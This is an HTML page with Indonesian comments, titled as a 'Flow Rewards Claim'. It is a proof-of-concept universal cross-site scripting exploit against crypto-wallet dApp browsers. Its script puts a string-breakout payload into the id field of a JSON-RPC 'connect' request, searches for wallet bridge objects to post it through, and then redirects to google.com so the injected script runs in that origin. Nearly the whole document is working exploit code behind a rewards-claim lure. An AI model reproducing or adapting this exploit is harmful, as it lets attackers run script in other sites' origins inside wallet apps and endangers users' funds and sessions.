<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flow Rewards Claim</title>
    <style>
        body { background: #000; color: #00ef8b; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #00ef8b; color: black; padding: 20px; border: none; border-radius: 12px; font-weight: bold; font-size: 1.2rem; cursor: pointer; }
        .status { margin-top: 20px; color: #888; font-size: 0.9rem; }
    </style>
</head>
<body>
    <h1>Flow Wallet Browser Test</h1>
    <p>Klik tombol di bawah untuk mencoba bypass:</p>
    
    <button class="btn" onclick="tryBypass()">CLICK TO BYPASS</button>
    <div id="log" class="status">Menunggu interaksi...</div>

    <script>
        function logMessage(msg) {
            document.getElementById('log').innerText = msg;
        }

        function tryBypass() {
            const victimSite = "https://www.google.com";
            
            // Payload UXSS yang menutup fungsi receiveResponseFromFlutter
            const maliciousId = '"); alert("UXSS BERHASIL! \nOrigin: " + location.origin); //';

            const payload = JSON.stringify({
                type: 'request',
                target: 'FuelContentScript', // Bisa disesuaikan jika nama target berbeda
                request: {
                    jsonrpc: '2.0',
                    id: maliciousId,
                    method: 'connect',
                    params: {}
                }
            });

            // Daftar kemungkinan jembatan (bridge) JavaScript di dApp Browser
            const bridges = [
                window.FueletWallet,
                window.flow,
                window.fcl,
                window.FlowWallet,
                window.android, // Sering digunakan di Android WebView
                window.webkit?.messageHandlers?.flowWallet
            ];

            let sent = false;

            for (let bridge of bridges) {
                if (bridge && typeof bridge.postMessage === 'function') {
                    logMessage("Mengirim melalui bridge ditemukan...");
                    bridge.postMessage(payload);
                    sent = true;
                    break;
                }
            }

            if (sent) {
                // Beri waktu 200ms agar pesan diproses, lalu pindah origin
                setTimeout(() => {
                    window.location.href = victimSite;
                }, 200);
            } else {
                logMessage("Gagal: Objek Wallet tetap tidak ditemukan.");
                alert("Objek Wallet tidak ditemukan. Pastikan Anda membuka melalui browser di dalam aplikasi dompet!");
            }
        }
    </script>
</body>
</html>
